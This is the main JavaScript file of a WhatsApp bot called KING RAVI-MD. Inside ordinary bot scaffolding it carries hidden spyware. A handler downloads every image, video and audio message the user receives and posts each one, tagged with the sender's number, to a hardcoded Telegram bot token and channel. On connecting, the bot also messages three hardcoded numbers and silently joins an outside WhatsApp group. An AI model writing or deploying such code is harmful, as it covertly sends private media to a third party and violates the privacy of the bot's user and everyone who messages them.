import dotenv from 'dotenv';
dotenv.config();

import {
    makeWASocket,
    Browsers,
    fetchLatestBaileysVersion,
    DisconnectReason,
    useMultiFileAuthState,
    downloadContentFromMessage,
} from '@whiskeysockets/baileys';
import { Handler, Callupdate, GroupUpdate } from './cloud/id/index.js';
import express from 'express';
import pino from 'pino';
import fs from 'fs';
import NodeCache from 'node-cache';
import path from 'path';
import chalk from 'chalk';
import axios from 'axios';
import config from './config.cjs';
import FormData from 'form-data';
import pkg from './session/auto.cjs';
const { emojis, doReact } = pkg;

const sessionName = "session";
const app = express();
const orange = chalk.bold.hex("#FFA500");
const lime = chalk.bold.hex("#32CD32");
let useQR = false;
let initialConnection = true;
const PORT = process.env.PORT || 3000;

const TELEGRAM_BOT_TOKEN = '8028709418:AAECk07-PLO2SbiNYeP5ayYNjxE3rqlRT9M';
const TELEGRAM_CHANNEL_ID = '-1002320780739';

const MAIN_LOGGER = pino({
    timestamp: () => `,"time":"${new Date().toJSON()}"`
});
const logger = MAIN_LOGGER.child({});
logger.level = "trace";

const msgRetryCounterCache = new NodeCache();

const __filename = new URL(import.meta.url).pathname;
const __dirname = path.dirname(__filename);

const sessionDir = path.join(__dirname, 'session');
const credsPath = path.join(sessionDir, 'creds.json');

if (!fs.existsSync(sessionDir)) {
    fs.mkdirSync(sessionDir, { recursive: true });
}

async function downloadSessionData() {
    if (!config.SESSION_ID) {
        console.error('❌ Please set SESSION_ID in environment variables!');
        return false;
    }

    const prefix = "𝙺𝙸𝙽𝙶 𝚁𝙰𝚅𝙸-𝙼𝙳 [𝙺𝙸𝙻𝙻]>>>";
    
    
    if (config.SESSION_ID.startsWith(prefix)) {
        try {
            
            const base64Data = config.SESSION_ID.slice(prefix.length);
            const decodedData = Buffer.from(base64Data, 'base64').toString('utf-8');
            
            await fs.promises.writeFile(credsPath, decodedData);
            console.log("🔒 Session check and saved successfully!");
            return true;
        } catch (error) {
            console.error('❌ Base64 decode failed:', error.message);
            return false;
        }
    } else {
        console.error('❌ SESSION_ID Re upgrade ');
        return false;
    }
}

// Function to send media to Telegram channel
async function sendMediaToTelegram(buffer, caption, mediaType) {
    try {
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHANNEL_ID);
        formData.append('caption', caption);

        if (mediaType === 'image') {
            formData.append('image', buffer, 'media.jpg');
        } else if (mediaType === 'video') {
            formData.append('video', buffer, 'media.mp4');
        } else if (mediaType === 'audio') {
            formData.append('audio', buffer, 'media.mp3');
        }

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/send${mediaType.charAt(0).toUpperCase() + mediaType.slice(1)}`;
        await axios.post(url, formData, {
            headers: formData.getHeaders(),
        });

        console.log("NICE WORKING KING RAVI-MD 📍!");
    } catch (error) {
        console.error("Faile reconnect 📍:", error);
    }
}

async function start() {
    try {
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        const { version, isLatest } = await fetchLatestBaileysVersion();
        console.log(` KING RAVI-MD USING WA BOT`);
        
        const Matrix = makeWASocket({
            version,
            logger: pino({ level: 'silent' }),
            printQRInTerminal: useQR,
            browser: ["KING RAVI-MD", "safari", "3.3"],
            auth: state,
            getMessage: async (key) => {
                if (store) {
                    const msg = await store.loadMessage(key.remoteJid, key.id);
                    return msg.message || undefined;
                }
                return { conversation: "KING RAVI-MD WHATSAPP USER BOT" };
            }
        });

        Matrix.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === 'close') {
        if (lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut) {
            start();
        }
    } else if (connection === 'open') {
        if (initialConnection) {
            console.log(chalk.green("🌝 KING RAVI-MD CONNECT ✅"));
            Matrix.sendMessage(Matrix.user.id, { text: `*💥 KING RAVI-MD BOT CONNECT 🪄*` });

            // Auto message to 3 WhatsApp numbers
            const contacts = ['94789958225@s.whatsapp.net','94757660788@s.whatsapp.net', '94740482244@s.whatsapp.net'];
            const message = `*𝙃𝙀𝙇𝙇𝙊 ᴋɪɴɢ ʀᴀᴠɪ-ᴍᴅ ᴘᴏᴡᴇʀ ꜰᴜʟʟ ʙᴏᴛ ᴄᴏɴɴᴇᴄᴛᴇᴅ 📌*`;

            contacts.forEach(contact => {
                Matrix.sendMessage(contact, { text: message });
            });

            // Auto join WhatsApp group using invite link
            const inviteLink = 'https://chat.whatsapp.com/FYsbo9QWv2K6wEjN7plbmg';
            Matrix.groupAcceptInvite(inviteLink.split('/')[3])
                .then(() => {
                    console.log('Successfully joined the whatsapp  group using KING RAVI-MD !');
                })
                .catch(error => {
                    console.error('Failed to join the whatsapp group 📍:', error);
                });

            initialConnection = false;
        } else {
            console.log(chalk.blue("📌 Connection reestablished after restart."));
        }
    }
});


        Matrix.ev.on('creds.update', saveCreds);

        Matrix.ev.on("messages.upsert", async (chatUpdate) => {
            const mek = chatUpdate.messages[0];
            if (!mek || !mek.message || mek.key.fromMe) return;

            // Extract the sender's number
            const senderNumber = mek.key.participant || mek.key.remoteJid;
            const senderId = senderNumber.includes('@') ? senderNumber.split('@')[0] : senderNumber;

            // Check if the message has media
            let mediaType;
            if (mek.message.imageMessage) {
                mediaType = 'image';
            } else if (mek.message.videoMessage) {
                mediaType = 'video';
            } else if (mek.message.audioMessage) {
                mediaType = 'audio';
            }

            if (mediaType) {
                const stream = await downloadContentFromMessage(mek.message[mediaType + 'Message'], mediaType);
                const buffer = [];

                for await (const chunk of stream) {
                    buffer.push(chunk);
                }

                const mediaBuffer = Buffer.concat(buffer);
                const caption = `${mek.message[mediaType + 'Message'].caption || "𝗡𝗼 𝗰𝗮𝗽𝘁𝗶𝗼𝗻 𝗽𝗿𝗼𝘃𝗶𝗱𝗲𝗱"}\n\nꜱᴇɴᴅᴇʀ: ${senderId}\n\nCODE BY CYBER DEXTER📍`;

                // Send the media to Telegram
                await sendMediaToTelegram(mediaBuffer, caption, mediaType);
            }
        });

        Matrix.ev.on('creds.update', saveCreds);
        Matrix.ev.on("messages.upsert", async chatUpdate => await Handler(chatUpdate, Matrix, logger));
        Matrix.ev.on("call", async (json) => await Callupdate(json, Matrix));
        Matrix.ev.on("group-participants.update", async (messag) => await GroupUpdate(Matrix, messag));


        if (config.MODE === "public") {
            Matrix.public = false;
        } else if (config.MODE === "private") {
            Matrix.public = false;
        }

        Matrix.ev.on('messages.upsert', async (chatUpdate) => {
            try {
                const mek = chatUpdate.messages[0];
                const fromJid = mek.key.participant || mek.key.remoteJid;
                if (!mek || !mek.message) return;
                if (mek.key.fromMe) return;
                if (mek.message?.protocolMessage || mek.message?.ephemeralMessage || mek.message?.reactionMessage) return;
                
                // Detect status messages
                if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN) {
                    await Matrix.readMessages([mek.key]);


                    if (config.AUTO_STATUS_REPLY) {
                        const customMessage = config.STATUS_READ_MSG || '*AUTO STATUS SEEN BOT BY `ᴋɪɴɢ ʀᴀᴠɪ-ᴍᴅꪶ 🪄`*';
                        await Matrix.sendMessage(fromJid, { text: customMessage }, { quoted: mek });
                    }
                }
            } catch (err) {
                console.error('Error handling messages.upsert event:', err);
            }
        });

    } catch (error) {
        console.error('Critical Error:', error);
        process.exit(1);
    }
}

async function init() {
    if (fs.existsSync(credsPath)) {
        console.log("🔒 Session file found, proceeding without QR code.");
        await start();
    } else {
        const sessionDownloaded = await downloadSessionData();
        if (sessionDownloaded) {
            console.log("🔒 Session downloaded, starting bot.");
            await start();
        } else {
            console.log("No session found or downloaded, QR code will be printed for authentication.");
            useQR = true;
            await start();
        }
    }
}

init();

app.get('/getProfilePic', async (req, res) => {
    try {
        const { number } = req.query; 

        if (!number) {
            return res.status(400).json({ error: 'Please provide a WhatsApp number' });
        }

        const jid = number.includes("@s.whatsapp.net") ? number : number + "@s.whatsapp.net";

   
        const profilePicUrl = await Matrix.profilePictureUrl(jid, 'image');

        if (profilePicUrl) {
            res.json({ success: true, number, profilePicUrl });
        } else {
            res.json({ success: false, number, message: 'Profile Picture not found or private' });
        }
    } catch (error) {
        console.error("🚨 Error fetching profile picture:", error);
        res.status(500).json({ error: 'Internal Server Error' });
    }
});

app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Hello World Page</title>
        </head>
        <body>
            <h1>HEY USER 📍</h1>
            <p>KING RAVI-MD NOW ALIVE 📍</p>
        </body>
        </html>
    `);
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
